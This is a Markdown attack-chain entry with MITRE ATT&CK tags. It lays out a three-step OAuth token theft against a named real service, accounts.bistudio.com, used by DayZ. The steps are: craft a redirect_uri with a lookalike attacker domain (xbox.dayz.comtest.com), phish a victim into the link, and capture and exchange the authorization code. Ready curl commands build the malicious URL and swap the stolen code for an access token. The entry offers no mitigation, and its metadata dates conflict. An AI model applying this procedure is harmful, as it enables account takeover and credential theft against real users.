---
tags:
  - oauth
  - open-redirect
  - token-theft
  - account-takeover
  - bistudio
type: attack_chain
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Credential Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
complexity: medium
procedures:
  - '[[procedures/Initiate-OAuth-Flow-from-Scoped-Website]]'
  - >-
    [[procedures/Craft-Malicious-OAuth-Authorization-URL-with-Tampered-redirect-uri]]
  - '[[procedures/Capture-Redirected-OAuth-Parameters-on-Malicious-Domain]]'
step_count: 3
techniques:
  - '[[Steal Application Access Token]]'
  - '[[Drive-by Compromise]]'
  - '[[T1566.002]]'
description: >-
  Multi-stage attack exploiting improper validation of the redirect_uri
  parameter in the OAuth flow on accounts.bistudio.com, allowing attackers to
  steal authorization codes and state parameters for account takeover.
skill_level: intermediate
impact_level: high
id: f0cf8ec1-4e50-4f0d-abb4-77308cb1f9fa
created_at: '2025-12-14T17:24:38.904Z'
updated_at: '2025-12-14T17:24:38.904Z'
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Credential Access]]'
mitre_techniques:
  - '[[Steal Application Access Token]]'
  - '[[Drive-by Compromise]]'
  - '[[T1566.002]]'
---
# OAuth Token Theft via Open Redirect in redirect_uri Validation

Multi-stage attack chain demonstrating exploitation of an open redirect vulnerability in the OAuth authorization flow on accounts.bistudio.com, enabling theft of OAuth authorization codes and state parameters to achieve account takeover on Bohemia Interactive services like DayZ.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 3 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Initiate OAuth Flow] --> B[Craft Malicious URL]
    B --> C[Capture Tokens via Redirect]
    C --> D[Account Takeover]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- Web browser (e.g., Chrome) for testing
- Attacker-controlled domain (e.g., registered similar domain like dayz.comtest.com)
- Basic web server to log redirects (e.g., Python HTTP server)

### Target Environment

- Web platform
- OAuth service on https://accounts.bistudio.com
- Scoped website like https://xbox.dayz.com

### Initial Access Requirements

- Ability to register a domain similar to the target (e.g., xbox.dayz.comtest.com)
- Network access to the internet
- No prior credentials needed; tricks users into clicking malicious links

## Detailed Attack Procedures

### Step 1: Initiate OAuth Flow
procedure: [[procedures/Initiate-OAuth-Flow-from-Scoped-Website]]

**Objective**: Trigger the standard OAuth authorization request from a legitimate scoped website to understand the flow and prepare for tampering.

**Instructions**: Navigate to the login page on a scoped website such as https://xbox.dayz.com, which initiates an OAuth request to https://accounts.bistudio.com/api/auth. Observe the default redirect_uri parameter, typically set to something like https://xbox.dayz.com/api/auth/callback.

**Expected Output**: The browser redirects to the OAuth authorization endpoint with parameters including client_id, redirect_uri, state, and scope.

**Success Indicators**:
- OAuth initiation URL visible in browser address bar or network logs
- Default redirect_uri starts with https://xbox.dayz.com/

### Step 2: Craft Malicious OAuth Authorization URL
procedure: [[procedures/Craft-Malicious-OAuth-Authorization-URL-with-Tampered-redirect-uri]]

**Objective**: Modify the redirect_uri to bypass validation by prefixing the allowed domain and appending an attacker-controlled domain, creating an open redirect.

**Instructions**: Analyze the OAuth URL from Step 1. Construct a tampered redirect_uri like https://xbox.dayz.comtest.com/api/auth/callback (note: http:// can also work if not strictly enforced). Build the full authorization URL, e.g., https://accounts.bistudio.com/api/auth?client_id=...&redirect_uri=https://xbox.dayz.comtest.com/api/auth/callback&state=...&response_type=code&scope=.... Trick a victim (e.g., via phishing email) into accessing this URL while logged in or authorizing.

To test, use curl to simulate:

```bash
curl "https://accounts.bistudio.com/api/auth?client_id=CLIENT_ID&redirect_uri=https://xbox.dayz.comtest.com/api/auth/callback&state=STATE&response_type=code&scope=SCOPE"
```

**Expected Output**: HTTP 302 redirect to the tampered redirect_uri with code and state in query parameters.

**Success Indicators**:
- Redirect response includes Location header pointing to attacker domain
- Parameters like code=AUTH_CODE&state=STATE appended

### Step 3: Capture Redirected OAuth Parameters
procedure: [[procedures/Capture-Redirected-OAuth-Parameters-on-Malicious-Domain]]

**Objective**: Receive the redirect on the attacker-controlled domain to steal the authorization code and state, then exchange the code for access tokens.

**Instructions**: Set up a simple web server on the attacker domain (e.g., xbox.dayz.comtest.com) to log incoming requests at /api/auth/callback. When the victim accesses the malicious URL, the server at accounts.bistudio.com redirects to your domain with ?code=...&state=.... Log the parameters. Use the stolen code to request tokens via POST to https://accounts.bistudio.com/api/token with client_id, client_secret, code, and grant_type=authorization_code.

Example token exchange (simulate with curl):

```bash
curl -X POST https://accounts.bistudio.com/api/token \
  -d "client_id=CLIENT_ID" \
  -d "client_secret=CLIENT_SECRET" \
  -d "code=STOLEN_CODE" \
  -d "grant_type=authorization_code" \
  -d "redirect_uri=https://xbox.dayz.comtest.com/api/auth/callback"
```

**Expected Output**: Access token in JSON response, enabling API access or account takeover.

**Success Indicators**:
- Logs show incoming redirect with code and state
- Successful token exchange yields valid access token

## Attack Chain Summary

### Key Achievements

1. Bypassed redirect_uri validation using domain prefix injection
2. Stole OAuth authorization code and state via open redirect
3. Achieved account takeover by exchanging code for access tokens

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Steal Application Access Token]] Steal Application Access Token
- [[Drive-by Compromise]] Drive-by Compromise
- [[T1566.002]] Spearphishing Link

### MITRE ATT&CK Tactics

- [[Initial Access]] Initial Access
- [[Credential Access]] Credential Access

---
*Last updated: 2023-10-01*
